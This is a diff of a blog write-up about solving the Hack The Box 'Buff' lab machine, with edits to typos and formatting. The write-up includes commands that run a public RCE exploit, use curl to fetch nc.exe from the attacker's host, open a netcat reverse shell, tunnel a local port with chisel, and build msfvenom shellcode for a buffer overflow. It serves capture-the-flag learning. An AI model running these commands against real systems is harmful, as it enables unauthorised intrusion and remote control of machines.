@@ -1,5 +1,5 @@
 ---
-title: Buff Writup
+title: Classified
 published: true
 ---
 
@@ -9,10 +9,12 @@ published: true
 1. [Introduction](#introduction)
 2. [Enumertion](#enumeration)
 3. [FootHold](#foothold)
-4. [Lateral Movement](#getting-proper-shell)
-5. [Privilege Escalation](#privilege-escilation)
+4. [Getting Proper Shell](#getting-proper-shell)
+5. [Privilege Escalation](#privilege-escalation)
 
 ## Introduction
+
+In my experience Buff Machine was overall a very good which teaches the basis of Enumeration, TCP-tunneling and Buffer-Overflow. The Machine was based on CVE so no manual exploitation was required. The User shell was pretty easy to get. For root shell we have to use knowledge of some advance techniques like TCP-Tunneling and Buffer Overflow. So Enjoy you'r learning.
 
 ## **Enumeration**
 
@@ -38,7 +40,7 @@ We got the nmap output. Let's examin it.
 So there is only one port open which is `port 8080/tcp` which is running `Apache httpd 2.4.43` and have http-title `mrb3 Bro Hut`. We also get information that the server is running php whose version is `PHP/7.4.6` and `OpenSSL/1.1.1g` and this is it, There are no more ports open in system.
 
 > **NOTE**: 
-There is one thing i need to tell you reader. In the above nmap scan i haven't specified port range so nmap uses its default range. To Scan the complete 65535 ports you can use `-p-` flag but it will take hell lot of time believe me. There are tools which you can use to scan port in matter of seconds. You can try [`rustscan`]() or [`masscan`]().
+There is one thing i need to tell you reader. In the above nmap scan i haven't specified port range so nmap uses it's default range. To Scan the complete 65535 ports you can use `-p-` flag but it will take hell lot of time believe me. There are tools which you can use to scan port in matter of seconds. You can try [`rustscan`]() or [`masscan`]().
 
 ### Banner Grabbing
 
@@ -94,7 +96,7 @@ We get the following output
 
 ![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/expbanner.png)
 
-So we have to pass the WEBAPP_URL to the exploit to work. So let's do it
+So we have to pass the <WEBAPP_URL> to the exploit to work. So let's do it
 
 `python exploit.py 'http://10.10.10.198/8080/'`
 
@@ -102,7 +104,7 @@ Andddd.... Bingo!! We got a RCE in the machine
 
 ![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/postexp.png)
 
-We can see that we are user `buff\shaun`. Now lets move ahead hacker..
+We can see that we are user `buff\shaun`. Now lets move ahead..
 
 ## **Getting Proper Shell**
 
@@ -110,11 +112,11 @@ So now after getting a RCE we have to get a shell. There are many ways to get a 
 
 1. Host a python server in which nc.exe is present
 
-`python3 -m http.server`
+    `python3 -m http.server`
 
 2. Now execute the following command after we have RCE.
 
-`cmd.exe /c curl http://<your tun0 IP address>:8000/nc.exe -o nc.exe`
+    `cmd.exe /c curl http://<your tun0 IP address>:8000/nc.exe -o nc.exe`
 
 ```
  cmd.exe : we are executing command prompt in the machine
@@ -146,7 +148,7 @@ First let's set up a listener in our machine using NetCat by entering the follow
 
 ![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/listener.png)
 
-Now let's do the magic shall we. Enter the following command in the RCE shell
+Now let's do the magic. Enter the following command in the RCE shell
 
 `nc.exe -e cmd.exe <your tun0 IP address> <port number>`
 
@@ -158,7 +160,7 @@ and press enter.....and boom we get a shell.
 
 ## **Privilege Escalation**
 
-When i am writing this writup the ratio of (root:user) solves are very less. People are easily getting user flag but having a hard time getting root shell. So let's start out journey to get the root shell.
+When i am writing this writup the ratio of (root:user) solves are very less. People are easily getting user shell but having a hard time getting root shell. So let's start out journey to get the shell flag.
 
 So in the last section we got a proper shell in the machine. Now let's enumerate and try to search for something worth. After spending some time i get a executable file inside the `Downloads` folder of user `shaun`
 
@@ -175,7 +177,9 @@ Let's Download the exploit and understand it what it is doing.
 
 So the exploit is a python script which contains payload to execute `calc.exe`. The script is creating a socket connection to `127.0.0.1:8888` and sending the payload. That's it..
 
-Now what we have to do is change the shell code to execute a reverse shell and run the script in the vulnerable machine....but if you'll see there is no python in the machine.....you can try to look for yourself. So what to do now ? Maybe what we can do is run the script on our machine and change the ip address to vulnerable machine and execute the script so that it makes socket connection to 10.10.10.198:8888 and send the payload and execute the reverse shell..but if you'll try this it will just throw error saying unable to connect and remeber we didn't saw port 8888 active in our nmap scan also. There is something fishy down there.
+Now what we have to do is change the shell code to execute a reverse shell and run the script in the vulnerable machine....but if you'll see there is no python in the machine.....you can try to look for yourself. So what to do now ? 
+
+Maybe what we can do is run the script on our machine and change the ip address to vulnerable machine and execute the script so that it makes socket connection to 10.10.10.198:8888 and send the payload and execute the reverse shell..but if you'll try this it will just throw error saying unable to connect and remeber we didn't saw port 8888 active in our nmap scan also. There is something fishy down there.
 
 Let's Check if the machine is listening on port 8888. Go to the machine shell and type the following command
 
@@ -193,7 +197,7 @@ The answer is TCP-Tunneling or Port-Forwarding. In simple word port forwarding r
 
 To perform TCP-Tunneling i'll use `chisel`. You can download it from [here](https://github.com/jpillora/chisel). You can also use `plink` if you want. I use chisel because why not ;-). So let's download chisel executable for linux and windows from releases.
 
-Now we should download the chisel.exe from our machine to vulnerable machine. To do this follow that same process like we have done to download [NetCat](#getting-proper-shell). 
+Now we should upload the chisel.exe to vulnerable machine. To do this follow that same process like we have done to upload [NetCat](#getting-proper-shell).
 
 ![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/cupload.png)
 
@@ -209,15 +213,15 @@ Now go to vulnerable machine and type the following command inside the `C:\xampp
 
 `cmd.exe command : chisel.exe client <your tun0 IP address> 8000 R:8888:127.0.0.1:8888`
 
-`powershell.exe command : .\chisel.exe client <your run0 IP address 8000 R:8888:127.0.0.1:8888>`
+`powershell.exe command : ./chisel.exe client <your tun0 IP address 8000 R:8888:127.0.0.1:8888>`
 
 ![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/chiselclient.png)
 
-> **NOTE** : In the above image i am using powershell
+> **NOTE** : In the above image i am using powershell. You have to use cmd.exe command.
 
-### Creting Payload
+### Creating Payload
 
-Now's Let's create out shellcode to get a reverse shell in out machine. To create our shellcode we are going to use msfvenom. If you don't know about msfvenom [here](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) is the link. In short msfvenom is a tool use to make shellcodes. So let's create out payload 
+Now's Let's create out shellcode to get a reverse shell in out machine. To create our shellcode we are going to use `msfvenom`. If you don't know about msfvenom [here](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) is the link. In short msfvenom is a tool use to make shellcodes. So let's create out payload 
 
 Enter the following command in your machine
 
@@ -249,6 +253,6 @@ Anddd... Boom! We get a root shell.
 
 > **NOTE** : If the exploit doesn't word execute it multiple time.
 
-Thanks for reading this post. If you think that something is missing or you didn't get it please feel free to email ne at `cyber.antiru@gmail.com`.
+Thanks for reading this post. If you think that something is missing or you didn't get it please feel free to email me at `cyber.antiru@gmail.com`.
 
 So Keep Hacking and see you in another post.
